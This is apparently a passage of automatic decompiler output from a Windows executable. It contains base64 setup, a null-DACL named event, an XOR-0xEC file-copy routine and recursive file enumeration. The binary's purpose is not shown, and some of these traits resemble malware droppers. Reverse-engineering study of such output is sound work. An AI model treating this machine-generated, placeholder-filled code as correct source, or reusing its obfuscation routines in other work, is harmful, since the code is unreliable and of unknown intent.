    char v4 = 16 * *v3; // 0x40443a
    char * v5 = (char *)(a1 + 1); // 0x40443d
    *v5 = v4;
    char * v6 = (char *)(a2 + 2); // 0x404440
    *v5 = *v6 / 4 & 15 | v4;
    char v7 = 64 * *v6; // 0x404451
    char * v8 = (char *)(a1 + 2); // 0x404454
    *v8 = v7;
    unsigned char v9 = *(char *)(a2 + 3) & 63 | v7; // 0x40445c
    *v8 = v9;
    return a2 & -256 | (int32_t)v9;
}

// Address range: 0x404465 - 0x4044ae
int32_t function_404465(int32_t a1, int32_t a2) {
    char * v1 = (char *)a2; // 0x40446e
    *(char *)a1 = *v1 / 4;
    char v2 = 16 * *v1; // 0x404477
    char * v3 = (char *)(a1 + 1); // 0x40447a
    *v3 = v2;
    char * v4 = (char *)(a2 + 1); // 0x40447d
    *v3 = *v4 / 16 | v2 & 48;
    char v5 = 4 * *v4; // 0x40448e
    char * v6 = (char *)(a1 + 2); // 0x404491
    *v6 = v5;
    char * v7 = (char *)(a2 + 2); // 0x404494
    *v6 = *v7 / 64 | v5 & 60;
    unsigned char v8 = *v7 & 63; // 0x4044a5
    *(char *)(a1 + 3) = v8;
    return a2 & -256 | (int32_t)v8;
}

// Address range: 0x4044ae - 0x4044c8
int32_t function_4044ae(unsigned char a1) {
    if (a1 >= 7) {
        // 0x4044b6
        if (a1 > 13 != a1 != 32) {
            // 0x4044c5
            return 1;
        }
    }
    // 0x4044c5
    return 0;
}

// Address range: 0x4044c8 - 0x40450f
// Used cryptographic patterns:
//  - B64EncodeTable (8-bit, little endian)
int32_t function_4044c8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x4044c8
    __asm_rep_stosd_memset((char *)&g25, -0x1010102, 64);
    int32_t result; // 0x4044e8
    for (int32_t i = 0; i < 64; i++) {
        char v1 = *(char *)(i + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x4044db
        int32_t v2 = v1; // 0x4044db
        char v3 = i; // 0x4044e2
        *(char *)(v2 + (int32_t)&g25) = v3;
        result = v2 & -256 | (int32_t)(v1 | -128);
        *(char *)(result + (int32_t)&g25) = v3;
    }
    // 0x4044f6
    g26 = -1;
    g27 = -1;
    g28 = 1;
    return result;
}

// Address range: 0x40450f - 0x40454b
int32_t function_40450f(int32_t a1, int32_t a2) {
    uint32_t size = a2 + 1; // 0x404519
    int32_t * v1 = (int32_t *)a1; // 0x40451c
    int32_t v2 = *v1; // 0x40451c
    int32_t * mem; // 0x40450f
    if (v2 != 0) {
        uint32_t v3 = _msize((int32_t *)v2); // 0x40452b
        int32_t v4 = *v1;
        if (v3 >= size) {
            // 0x404541
            return v4 != 0;
        }
        // 0x404535
        mem = realloc((int32_t *)v4, size);
    } else {
        // 0x404522
        mem = malloc(size);
    }
    int32_t v5 = (int32_t)mem;
    *v1 = v5;
    // 0x404541
    return v5 != 0;
}

// Address range: 0x40454b - 0x404562
int32_t function_40454b(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x404550
    int32_t v2 = *v1; // 0x404550
    int32_t result = 0; // 0x404554
    if (v2 != 0) {
        // 0x404556
        free((int32_t *)v2);
        *v1 = 0;
        result = &g57;
    }
    // 0x404560
    return result;
}

// Address range: 0x404562 - 0x4045eb
int32_t function_404562(int32_t a1) {
    // 0x404562
    char * lpName; // bp-32, 0x404562
    int32_t v1 = (int32_t)&lpName; // 0x40456f
    lpName = (char *)0x56454353;
    bool v2; // 0x404562
    int32_t v3 = v2 ? -4 : 4; // 0x404572
    int32_t v4 = v3 + v1; // 0x404572
    int32_t v5 = v3 + (int32_t)"SCEVT_OA0293"; // 0x404572
    *(int32_t *)v4 = *(int32_t *)v5;
    int32_t v6 = v4 + v3; // 0x404573
    int32_t v7 = v5 + v3; // 0x404573
    *(int32_t *)v6 = *(int32_t *)v7;
    *(char *)(v6 + v3) = *(char *)(v7 + v3);
    int32_t v8; // bp-68, 0x404562
    if (a1 == 0) {
        // 0x4045d7
        v8 = 0;
        // 0x4045e7
        return (int32_t)OpenEventA(0x1f0003, false, (char *)&lpName);
    }
    // 0x40457d
    int32_t v9; // bp-16, 0x404562
    memset(&v9, 0, 12);
    v9 = 12;
    int32_t pSecurityDescriptor; // bp-52, 0x404562
    int32_t v10 = &pSecurityDescriptor; // 0x404599
    v8 = v10;
    bool v11 = InitializeSecurityDescriptor(&pSecurityDescriptor, 1); // 0x40459a
    int32_t * v12 = &v8; // 0x4045a2
    int32_t * v13; // 0x4045c6
    if (v11) {
        int32_t v14 = v10; // bp-84, 0x4045ab
        bool v15 = SetSecurityDescriptorDacl(&pSecurityDescriptor, true, NULL, false); // 0x4045ac
        v12 = &v14;
        if (v15) {
            // 0x4045c6
            v13 = CreateEventA((struct _SECURITY_ATTRIBUTES *)&g57, (bool)&g57, (bool)&g57, (char *)&g57);
            // 0x4045e7
            return (int32_t)v13;
        }
    }
    int32_t v16 = (int32_t)v12;
    *(int32_t *)(v16 - 4) = v1;
    *(int32_t *)(v16 - 8) = 0;
    *(int32_t *)(v16 - 12) = 0;
    *(int32_t *)(v16 - 16) = 0;
    // 0x4045c6
    v13 = CreateEventA((struct _SECURITY_ATTRIBUTES *)&g57, (bool)&g57, (bool)&g57, (char *)&g57);
    // 0x4045e7
    return (int32_t)v13;
}

// Address range: 0x4045eb - 0x404618
int32_t function_4045eb(int32_t result) {
    char * lpFilename = (char *)result; // 0x4045f8
    if (GetModuleFileNameA(NULL, lpFilename, 260) == 0) {
        // 0x404611
        *lpFilename = 0;
    } else {
        // 0x404602
        *_mbsrchr(lpFilename, 92) = 0;
    }
    // 0x404614
    return result;
}

// Address range: 0x404618 - 0x404700
int32_t function_404618(void) {
    // 0x404618
    function_408520((int32_t)&g57);
    int32_t v1; // 0x404618
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40462e
    *v2 = 0;
    int32_t * v3 = (int32_t *)(v1 - 16);
    int32_t v4; // bp-1040, 0x404618
    int32_t v5 = &v4; // 0x404631
    int32_t v6 = 8; // 0x404631
    int32_t result; // 0x404618
    int32_t v7; // 0x404618
    int32_t v8; // 0x404618
    int32_t v9; // 0x404618
    int32_t v10; // 0x40464d
    int32_t v11; // 0x404618
    while (true) {
      lab_0x404632_2:
        // 0x404632
        v7 = v6;
        v8 = v5;
        int32_t v12 = *(int32_t *)(v1 + 12); // 0x404632
        *(int32_t *)(v8 - 4) = 0;
        *(int32_t *)(v8 - 8) = 0xc000000;
        *(int32_t *)(v8 - 12) = 3;
        *(int32_t *)(v8 - 16) = 0;
        *(int32_t *)(v8 - 20) = 0;
        *(int32_t *)(v8 - 24) = 0x40000000;
        v10 = v8 - 28;
        *(int32_t *)v10 = v12 != 0 ? v12 : (int32_t)&g2;
        int32_t * fileHandle = CreateFileA((char *)&g57, (int32_t)&g57, (int32_t)&g57, (struct _SECURITY_ATTRIBUTES *)&g57, (int32_t)&g57, (int32_t)&g57, &g57); // 0x40464e
        v11 = (int32_t)fileHandle;
        *v3 = v11;
        if (fileHandle != (int32_t *)-1) {
            // break -> 0x40468e
            break;
        }
        if (v7 == 0) {
            goto lab_0x404692;
        }
        int32_t errorCode = GetLastError(); // 0x404663
        v5 = v10;
        switch (errorCode) {
            case 0: {
                goto lab_0x404632;
            }
            case 2: {
                // 0x404689
                *(int32_t *)(v8 - 32) = 1;
                result = 1;
                v9 = v10;
                goto lab_0x4046e2;
            }
            case 32: {
                goto lab_0x40467c;
            }
            default: {
                // 0x404677
                result = 0;
                v9 = v10;
                if (errorCode != 33) {
                    goto lab_0x4046e2;
                }
                goto lab_0x40467c;
            }
        }
    }
    // 0x40468e
    result = 0;
    v9 = v10;
    if (v7 != 0) {
      lab_0x404692:
        // 0x404692
        *(int32_t *)(v8 - 36) = 0;
        int32_t v13 = v8 - 40; // 0x404694
        *(int32_t *)v13 = v11;
        int32_t v14 = GetFileSize(&g57, &g57); // 0x404695
        *(int32_t *)(v8 - 44) = 1024;
        int32_t v15 = v1 - 1044; // 0x4046a3
        *(int32_t *)(v8 - 48) = 0;
        *(int32_t *)(v8 - 52) = v15;
        int32_t v16 = v1 - 20; // 0x4046ab
        int32_t * v17 = (int32_t *)v16; // 0x4046ab
        *v17 = 0;
        memset(&g57, (int32_t)&g57, (int32_t)&g57);
        int32_t v18 = v13; // 0x4046b8
        if (v14 > 0) {
            *(int32_t *)(v13 - 4) = 0;
            *(int32_t *)(v13 - 8) = v16;
            *(int32_t *)(v13 - 12) = 1024;
            *(int32_t *)(v13 - 16) = v15;
            int32_t v19 = v13 - 20; // 0x4046c7
            *(int32_t *)v19 = *v3;
            WriteFile(&g57, &g57, (int32_t)&g57, &g57, (struct _OVERLAPPED *)&g57);
            int32_t v20 = v14 - *v17; // 0x4046d0
            int32_t v21 = v20; // 0x4046b8
            int32_t v22 = v19; // 0x4046b8
            v18 = v19;
            while (v20 > 0) {
                // 0x4046ba
                *(int32_t *)(v22 - 4) = 0;
                *(int32_t *)(v22 - 8) = v16;
                *(int32_t *)(v22 - 12) = 1024;
                *(int32_t *)(v22 - 16) = v15;
                v19 = v22 - 20;
                *(int32_t *)v19 = *v3;
                WriteFile(&g57, &g57, (int32_t)&g57, &g57, (struct _OVERLAPPED *)&g57);
                v20 = v21 - *v17;
                v21 = v20;
                v22 = v19;
                v18 = v19;
            }
        }
        // 0x4046d5
        *(int32_t *)(v18 - 4) = *v3;
        CloseHandle(&g57);
        *(int32_t *)(v18 - 8) = 1;
        result = 1;
        v9 = v18;
    }
    goto lab_0x4046e2;
  lab_0x4046e2:
    // 0x4046e2
    *v2 = -1;
    *(int32_t *)(v9 - 4) = 1;
    function_4047b7((int32_t)&g57);
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return result;
  lab_0x404632:
    // 0x404632
    v6 = v7 - 1;
    goto lab_0x404632_2;
  lab_0x40467c:;
    int32_t v23 = v8 - 32; // 0x40467c
    *(int32_t *)v23 = 250;
    Sleep((int32_t)&g57);
    v5 = v23;
    goto lab_0x404632;
}

// Address range: 0x404700 - 0x4047af
int32_t function_404700(int32_t a1, int32_t a2) {
    // 0x404700
    int32_t v1; // bp-1040, 0x404700
    int32_t v2 = &v1; // 0x40470b
    int32_t v3 = v2 - 4; // 0x404716
    int32_t * v4 = (int32_t *)v3; // 0x404716
    *v4 = (int32_t)"rb";
    int32_t * v5 = (int32_t *)(v2 - 8); // 0x404717
    *v5 = a1;
    struct _IO_FILE * file = fopen((char *)&g57, (char *)&g57); // 0x40471a
    int32_t v6 = 2000; // 0x404725
    int32_t v7 = v2; // 0x404725
    int32_t * v8 = v4; // 0x404725
    int32_t * v9 = v5; // 0x404725
    struct _IO_FILE * v10 = file; // 0x404725
    if (file == NULL) {
        *v4 = v6;
        Sleep((int32_t)&g57);
        int32_t v11 = v3 - 4; // 0x404716
        int32_t * v12 = (int32_t *)v11;
        *v12 = (int32_t)"rb";
        int32_t * v13 = (int32_t *)(v3 - 8);
        *v13 = a1;
        struct _IO_FILE * file2 = fopen((char *)&g57, (char *)&g57); // 0x40471a
        v6 -= 250;
        v7 = v3;
        v8 = v12;
        v9 = v13;
        v10 = file2;
        while (file2 == NULL) {
            int32_t v14 = v11;
            *v12 = v6;
            Sleep((int32_t)&g57);
            v11 = v14 - 4;
            v12 = (int32_t *)v11;
            *v12 = (int32_t)"rb";
            v13 = (int32_t *)(v14 - 8);
            *v13 = a1;
            file2 = fopen((char *)&g57, (char *)&g57);
            v6 -= 250;
            v7 = v14;
            v8 = v12;
            v9 = v13;
            v10 = file2;
        }
    }
    int32_t v15 = (int32_t)v10;
    *v8 = (int32_t)"wb";
    *v9 = a2;
    struct _IO_FILE * file3 = fopen((char *)&g57, (char *)&g57); // 0x40473e
    if (file3 == NULL) {
        // 0x40474b
        *v8 = v15;
        fclose((struct _IO_FILE *)&g57);
        // 0x4047aa
        return 0;
    }
    int32_t v16 = (int32_t)file3; // 0x40473e
    int32_t * v17 = (int32_t *)(v7 - 12); // 0x404762
    int32_t * v18 = (int32_t *)(v7 - 16); // 0x404764
    int32_t v19; // bp-1028, 0x404700
    int32_t v20 = &v19; // 0x404764
    *v8 = v15;
    *v9 = 1024;
    *v17 = 1;
    *v18 = v20;
    int32_t items_read = fread(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57); // 0x404765
    int32_t v21 = 0; // 0x404773
    int32_t v22; // bp-4, 0x404700
    char * v23; // 0x404775
    int32_t v24; // 0x40477d
    if (items_read != 0) {
        v23 = (char *)((int32_t)&v22 - 1024 + v21);
        *v23 = *v23 ^ -20;
        v24 = v21 + 1;
        v21 = v24;
        while (v24 != items_read) {
            // 0x404775
            v23 = (char *)((int32_t)&v22 - 1024 + v21);
            *v23 = *v23 ^ -20;
            v24 = v21 + 1;
            v21 = v24;
        }
    }
    // 0x404782
    *v8 = v16;
    *v9 = items_read;
    *v17 = 1;
    *v18 = v20;
    fwrite(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
    while (items_read != 0) {
        // 0x404756
        *v8 = v15;
        *v9 = 1024;
        *v17 = 1;
        *v18 = v20;
        items_read = fread(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
        v21 = 0;
        if (items_read != 0) {
            v23 = (char *)((int32_t)&v22 - 1024 + v21);
            *v23 = *v23 ^ -20;
            v24 = v21 + 1;
            v21 = v24;
            while (v24 != items_read) {
                // 0x404775
                v23 = (char *)((int32_t)&v22 - 1024 + v21);
                *v23 = *v23 ^ -20;
                v24 = v21 + 1;
                v21 = v24;
            }
        }
        // 0x404782
        *v8 = v16;
        *v9 = items_read;
        *v17 = 1;
        *v18 = v20;
        fwrite(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
    }
    // 0x404799
    *v8 = v15;
    fclose((struct _IO_FILE *)&g57);
    *v9 = v16;
    fclose((struct _IO_FILE *)&g57);
    *v8 = 1;
    // 0x4047aa
    return 1;
}

// Address range: 0x4047af - 0x4047b7
int32_t function_4047af(void) {
    // 0x4047af
    return function_4047b7(1);
}

// Address range: 0x4047b7 - 0x4047f3
int32_t function_4047b7(int32_t a1) {
    // 0x4047b7
    int32_t v1; // 0x4047b7
    int32_t * v2 = (int32_t *)(v1 + 4);
    int32_t result; // 0x4047b7
    if ((char)a1 == 0) {
        // 0x4047e3
        *v2 = 0;
        *(int32_t *)(v1 + 8) = 0;
        *(int32_t *)(v1 + 12) = 0;
        return result;
    }
    int32_t v3 = *v2; // 0x4047c1
    if (v3 == 0) {
        // 0x4047e3
        *v2 = 0;
        *(int32_t *)(v1 + 8) = 0;
        *(int32_t *)(v1 + 12) = 0;
        return 0;
    }
    int32_t v4 = v3 - 1; // 0x4047c8
    char * v5 = (char *)v4; // 0x4047cb
    unsigned char v6 = *v5; // 0x4047cb
    switch (v6) {
        case 0: {
        }
        case -1: {
            // 0x4047dc
            result = _3f__3f_3_40_YAXPAX_40_Z((int32_t *)v4);
            // break -> 0x4047e3
            break;
        }
        default: {
            int32_t v7 = v3 & -256; // 0x4047cb
            int32_t v8 = (v7 | (int32_t)v6) + 255; // 0x4047d6
            *v5 = (char)v8;
            result = v8 & 255 | v7;
            // break -> 0x4047e3
            break;
        }
    }
    // 0x4047e3
    *v2 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 12) = 0;
    return result;
}

// Address range: 0x4047f3 - 0x404814
int32_t function_4047f3(void) {
    // 0x4047f3
    if ((g53 & 1) == 0) {
        // 0x4047fc
        g53 |= 1;
    }
    // 0x404808
    return function_408584(0x4078aa);
}

// Address range: 0x404814 - 0x40486d
int32_t function_404814(int32_t a1, int32_t a2) {
    // 0x404814
    function_408520((int32_t)&g57);
    int32_t v1; // 0x404814
    int32_t v2 = v1 - 32; // 0x40482a
    *(char *)v2 = *(char *)(v1 - 13);
    function_4047b7(0);
    strlen("string too long");
    function_405027((int32_t)"string too long");
    *(int32_t *)(v1 - 4) = 0;
    function_40486e(v2);
    int32_t * v3 = (int32_t *)(v1 - 60); // 0x404861
    *v3 = (int32_t)&g3;
    _CxxThrowException(v3, &g10);
    // UNREACHABLE
}

// Address range: 0x40486d - 0x40486e
int32_t function_40486d(int32_t a1) {
    // 0x40486d
    int32_t result; // 0x40486d
    return result;
}

// Address range: 0x40486e - 0x4048d2
int32_t function_40486e(int32_t a1) {
    // 0x40486e
    function_408520((int32_t)&g57);
    int32_t v1; // 0x40486e
    *(int32_t *)(v1 - 16) = (int32_t)&g29;
    int32_t result; // 0x40486e
    _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)result);
    int32_t v2 = *(int32_t *)(v1 + 8); // 0x404892
    *(int32_t *)(v1 - 4) = 0;
    *(char *)(result + 12) = *(char *)v2;
    function_4047b7(0);
    function_404f59(v2, 0, -1);
    *(int32_t *)result = (int32_t)&g4;
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return result;
}

// Address range: 0x4048d2 - 0x4048df
int32_t function_4048d2(void) {
    // 0x4048d2
    int32_t v1; // 0x4048d2
    int32_t v2 = *(int32_t *)(v1 + 16); // 0x4048d2
    return v2 != 0 ? v2 : (int32_t)&g2;
}

// Address range: 0x4048e7 - 0x4048f4
int32_t function_4048e7(void) {
    char v1 = __asm_in(-24); // 0x4048e8
    int32_t v2; // 0x4048e7
    int32_t v3; // 0x4048e7
    char * v4 = (char *)(v3 + v2 & 0xffff); // 0x4048ea
    *v4 = *v4 + v1;
    int32_t v5; // 0x4048e7
    char * v6 = (char *)(v5 - 0xf971bbc); // 0x4048ed
    int32_t v7; // 0x4048e7
    *v6 = *v6 + (char)v7;
    int32_t v8; // 0x4048e7
    return v8 & -256 | (int32_t)v1;
}

// Address range: 0x4048fc - 0x404939
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t ??1?$_Mpunct@D@std@@MAE@XZ2(void) {
    // 0x4048fc
    function_408520((int32_t)&g57);
    int32_t v1; // 0x4048fc
    *(int32_t *)v1 = (int32_t)&g4;
    int32_t v2; // 0x4048fc
    int32_t * v3 = (int32_t *)(v2 - 4); // 0x404913
    *v3 = 0;
    function_4047b7(1);
    *v3 = -1;
    int32_t result = _3f__3f_1exception_40__40_UAE_40_XZ(); // 0x404927
    __writefsdword(0, *(int32_t *)(v2 - 12));
    return result;
}

// Address range: 0x404955 - 0x4049b2
int32_t function_404955(int32_t a1, int32_t a2) {
    // 0x404955
    function_408520((int32_t)&g57);
    int32_t result; // 0x404955
    int32_t * v1 = (int32_t *)result; // 0x40496c
    _3f__3f_0exception_40__40_QAE_40_ABV0_40__40_Z(v1);
    int32_t v2; // 0x404955
    int32_t v3 = *(int32_t *)(v2 + 8) + 12; // 0x404971
    *(int32_t *)(v2 - 4) = 0;
    *(char *)(result + 12) = *(char *)v3;
    function_4047b7(0);
    function_404f59(v3, 0, -1);
    *v1 = (int32_t)&g4;
    __writefsdword(0, *(int32_t *)(v2 - 12));
    return result;
}

// Address range: 0x4049b2 - 0x4049ef
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t ??1?$_Mpunct@D@std@@MAE@XZ3(void) {
    // 0x4049b2
    function_408520((int32_t)&g57);
    int32_t v1; // 0x4049b2
    *(int32_t *)v1 = (int32_t)&g4;
    int32_t v2; // 0x4049b2
    int32_t * v3 = (int32_t *)(v2 - 4); // 0x4049c9
    *v3 = 0;
    function_4047b7(1);
    *v3 = -1;
    int32_t result = _3f__3f_1exception_40__40_UAE_40_XZ(); // 0x4049dd
    __writefsdword(0, *(int32_t *)(v2 - 12));
    return result;
}

// Address range: 0x4049fb - 0x404a04
int32_t function_4049fb(void) {
    // 0x4049fb
    int32_t result; // 0x4049fb
    *(char *)result = 2 * (char)result;
    int32_t v1; // 0x4049fb
    char * v2 = (char *)(v1 - 0x7f971bbb); // 0x4049fd
    int32_t v3; // 0x4049fb
    *v2 = *v2 + (char)v3;
    return result;
}

// Address range: 0x404a28 - 0x404a40
int32_t function_404a28(int32_t a1) {
    // 0x404a28
    int32_t v1; // 0x404a28
    function_404955(a1, v1);
    int32_t result; // 0x404a28
    *(int32_t *)result = (int32_t)&g3;
    return result;
}

// Address range: 0x404a40 - 0x404a99
int32_t function_404a40(int32_t a1, int32_t a2, int32_t a3) {
    // 0x404a40
    function_408520((int32_t)&g57);
    int32_t v1; // 0x404a40
    int32_t v2 = v1 - 32; // 0x404a56
    *(char *)v2 = *(char *)(v1 - 13);
    function_4047b7(0);
    strlen("invalid string position");
    function_405027((int32_t)"invalid string position");
    *(int32_t *)(v1 - 4) = 0;
    function_40486e(v2);
    int32_t * v3 = (int32_t *)(v1 - 60); // 0x404a8d
    *v3 = (int32_t)&g5;
    _CxxThrowException(v3, &g11);
    // UNREACHABLE
}

// Address range: 0x404a99 - 0x404ad7
int32_t function_404a99(int32_t a1) {
    // 0x404a99
    function_408520((int32_t)&g57);
    int32_t v1; // 0x404a99
    *(int32_t *)v1 = (int32_t)&g4;
    int32_t v2; // 0x404a99
    int32_t * v3 = (int32_t *)(v2 - 4); // 0x404ab1
    *v3 = 0;
    function_4047b7(1);
    *v3 = -1;
    int32_t result = _3f__3f_1exception_40__40_UAE_40_XZ(); // 0x404ac5
    __writefsdword(0, *(int32_t *)(v2 - 12));
    return result;
}

// Address range: 0x404b10 - 0x404b28
int32_t function_404b10(int32_t a1) {
    // 0x404b10
    int32_t v1; // 0x404b10
    function_404955(a1, v1);
    int32_t result; // 0x404b10
    *(int32_t *)result = (int32_t)&g5;
    return result;
}

// Address range: 0x404b28 - 0x404bb1
int32_t function_404b28(int32_t a1, int32_t a2) {
    int32_t v1 = 0; // bp-8, 0x404b31
    int32_t v2 = 0; // bp-12, 0x404b35
    if (SHGetMalloc((int32_t **)&v1) < 0) {
        // 0x404b47
        return 0;
    }
    int32_t v3 = 0; // bp-292, 0x404b53
    if (SHGetSpecialFolderLocation(NULL, a1, (int32_t **)&v2) != 0) {
        // 0x404ba3
        *(int32_t *)((int32_t)&v3 - 4) = v1;
        return 0;
    }
    int32_t v4 = v2; // bp-300, 0x404b6b
    int32_t str; // bp-272, 0x404b28
    bool result = SHGetPathFromIDListA((int32_t *)v2, (char *)&str); // 0x404b6e
    int32_t * v5 = &v4; // 0x404b78
    if (result) {
        // 0x404b7a
        strlen((char *)&str);
        int32_t v6 = &str; // 0x404b91
        int32_t v7 = v6; // bp-308, 0x404b91
        function_405027(v6);
        v5 = &v7;
    }
    int32_t v8 = (int32_t)v5;
    *(int32_t *)(v8 - 4) = v2;
    int32_t v9 = v8 - 8; // 0x404b9f
    *(int32_t *)v9 = v1;
    // 0x404ba3
    *(int32_t *)(v9 - 4) = v1;
    return result;
}

// Address range: 0x404bb1 - 0x404d43
int32_t function_404bb1(void) {
    // 0x404bb1
    function_408520((int32_t)&g57);
    int32_t v1; // 0x404bb1
    int32_t v2 = v1 - 4; // 0x404bd4
    int32_t * v3 = (int32_t *)v2; // 0x404bd4
    *v3 = 1;
    char * v4 = (char *)(v1 - 60); // bp-424, 0x404bd7
    int32_t v5 = function_405235(); // 0x404bd8
    int32_t v6 = v1 + 24; // 0x404bdd
    char * v7 = (char *)v2; // 0x404be0
    *v7 = 2;
    int32_t v8 = v1 - 36; // 0x404be6
    function_4052be(v8, v5, v6);
    *v7 = 4;
    function_4047b7(1);
    int32_t v9 = *(int32_t *)(v1 - 32); // 0x404bff
    int32_t lpFindFileData = v1 - 412; // 0x404c0b
    char * lpFileName = v9 != 0 ? (char *)v9 : (char *)&g2; // 0x404c12
    v4 = lpFileName;
    int32_t v10 = (int32_t)&v4; // 0x404c12
    int32_t * v11 = FindFirstFileA(lpFileName, (struct _WIN32_FIND_DATAA *)lpFindFileData); // 0x404c13
    int32_t * v12 = (int32_t *)(v1 - 16); // 0x404c19
    *v12 = 0;
    int32_t * v13 = (int32_t *)(v1 - 20); // 0x404c20
    *v13 = (int32_t)v11;
    int32_t v14 = v10; // 0x404c23
    if (v11 != (int32_t *)-1) {
        int32_t v15 = v1 - 368; // 0x404c29
        int32_t v16 = v10; // 0x404c30
        int32_t * v17; // 0x404c46
        int32_t * v18; // 0x404c47
        int32_t * v19; // 0x404c4b
        int32_t v20; // 0x404c4c
        int32_t * v21; // 0x404c5b
        int32_t * v22; // 0x404c5c
        int32_t v23; // 0x404c61
        int32_t v24; // 0x404c9b
        int32_t v25; // 0x404ca3
        if (*(char *)v15 != 46) {
            // 0x404c36
            if ((*(char *)lpFindFileData & 16) == 0) {
                // 0x404ce7
                *v12 = *v12 + 1;
                v16 = v10;
            } else {
                // 0x404c43
                v17 = (int32_t *)(v10 - 4);
                *v17 = (int32_t)&g18;
                v18 = (int32_t *)(v10 - 8);
                *v18 = v1 + 8;
                v19 = (int32_t *)(v10 - 12);
                *v19 = v1 - 76;
                v20 = function_405235();
                *v7 = 5;
                v21 = (int32_t *)(v10 - 16);
                *v21 = v15;
                v22 = (int32_t *)(v10 - 20);
                *v22 = v20;
                *(int32_t *)(v10 - 24) = v1 - 92;
                v23 = function_405235();
                *v17 = -1;
                *v7 = 6;
                *v18 = 0;
                *v19 = v23;
                function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
                *v21 = 1;
                *v7 = 5;
                function_4047b7((int32_t)&g57);
                *v22 = 1;
                *v7 = 4;
                function_4047b7((int32_t)&g57);
                v24 = v10 - 36;
                *(int32_t *)(v1 - 44) = v24;
                v25 = v10 - 40;
                *(int32_t *)v25 = 0;
                *(char *)v24 = *(char *)v6;
                function_4047b7((int32_t)&g57);
                *(int32_t *)(v10 - 44) = -1;
                *(int32_t *)(v10 - 48) = 0;
                *(int32_t *)(v10 - 52) = v6;
                function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
                *(int32_t *)(v1 - 40) = v10 - 68;
                *(int32_t *)(v10 - 72) = v8;
                *v7 = 7;
                function_404f2f((int32_t)&g57);
                *v7 = 4;
                *v12 = *v12 + function_404bb1();
                v16 = v25;
            }
        }
        int32_t v26 = v16;
        *(int32_t *)(v26 - 4) = lpFindFileData;
        int32_t v27 = v26 - 8; // 0x404cf1
        *(int32_t *)v27 = *v13;
        while (FindNextFileA(&g57, (struct _WIN32_FIND_DATAA *)&g57)) {
            int32_t v28 = v27;
            v16 = v28;
            if (*(char *)v15 != 46) {
                // 0x404c36
                if ((*(char *)lpFindFileData & 16) == 0) {
                    // 0x404ce7
                    *v12 = *v12 + 1;
                    v16 = v28;
                } else {
                    // 0x404c43
                    v17 = (int32_t *)(v28 - 4);
                    *v17 = (int32_t)&g18;
                    v18 = (int32_t *)(v28 - 8);
                    *v18 = v1 + 8;
                    v19 = (int32_t *)(v28 - 12);
                    *v19 = v1 - 76;
                    v20 = function_405235();
                    *v7 = 5;
                    v21 = (int32_t *)(v28 - 16);
                    *v21 = v15;
                    v22 = (int32_t *)(v28 - 20);
                    *v22 = v20;
                    *(int32_t *)(v28 - 24) = v1 - 92;
                    v23 = function_405235();
                    *v17 = -1;
                    *v7 = 6;
                    *v18 = 0;
                    *v19 = v23;
                    function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
                    *v21 = 1;
                    *v7 = 5;
                    function_4047b7((int32_t)&g57);
                    *v22 = 1;
                    *v7 = 4;
                    function_4047b7((int32_t)&g57);
                    v24 = v28 - 36;
                    *(int32_t *)(v1 - 44) = v24;
                    v25 = v28 - 40;
                    *(int32_t *)v25 = 0;
                    *(char *)v24 = *(char *)v6;
                    function_4047b7((int32_t)&g57);
                    *(int32_t *)(v28 - 44) = -1;
                    *(int32_t *)(v28 - 48) = 0;
                    *(int32_t *)(v28 - 52) = v6;
                    function_404f59((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
                    *(int32_t *)(v1 - 40) = v28 - 68;
                    *(int32_t *)(v28 - 72) = v8;
                    *v7 = 7;
                    function_404f2f((int32_t)&g57);
                    *v7 = 4;
                    *v12 = *v12 + function_404bb1();
                    v16 = v25;
                }
            }
            // 0x404cea
            v26 = v16;
            *(int32_t *)(v26 - 4) = lpFindFileData;
            v27 = v26 - 8;
            *(int32_t *)v27 = *v13;
        }
        // 0x404d02
        v14 = v26 - 12;
        *(int32_t *)v14 = *v13;
        FindClose(&g57);
    }
    // 0x404d0b
    *(int32_t *)(v14 - 4) = 1;
    *v7 = 1;
    function_4047b7((int32_t)&g57);
    *v7 = 0;
    *(int32_t *)(v14 - 8) = 1;
    function_4047b7((int32_t)&g57);
    *v3 = -1;
    *(int32_t *)(v14 - 12) = 1;
    function_4047b7((int32_t)&g57);
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return *v12;
}

// Address range: 0x404d43 - 0x404e11
int32_t function_404d43(int32_t a1) {
    int32_t v1 = a1; // bp-272, 0x404d4d
    char * lpFileName = (char *)a1; // 0x404d50
    int32_t v2 = GetFileAttributesA(lpFileName); // 0x404d50
    if (v2 != -1) {
        // 0x404d5b
        if ((v2 & 16) != 0) {
            // 0x404e0b
            *(int32_t *)((int32_t)&v1 - 4) = 1;
            // 0x404e0e
            return 1;
        }
    }
    int32_t v3 = a1; // bp-276, 0x404d63
    char str; // bp-264, 0x404d43
    strcpy(&str, lpFileName);
    int32_t v4 = &str; // 0x404d7b
    int32_t v5 = v4; // 0x404d81
    if (str == 58) {
        // 0x404d83
        v3 = 3;
        v5 = (int32_t)_mbsninc(&str, 3);
    }
    // 0x404d95
    v3 = v4;
    int32_t v6 = &v3; // 0x404d9b
    int32_t len = strlen(&str); // 0x404d9c
    int32_t v7; // bp-4, 0x404d43
    int32_t v8 = (int32_t)&v7 - 260; // 0x404da1
    if (v5 > len + v8) {
        // 0x404e0b
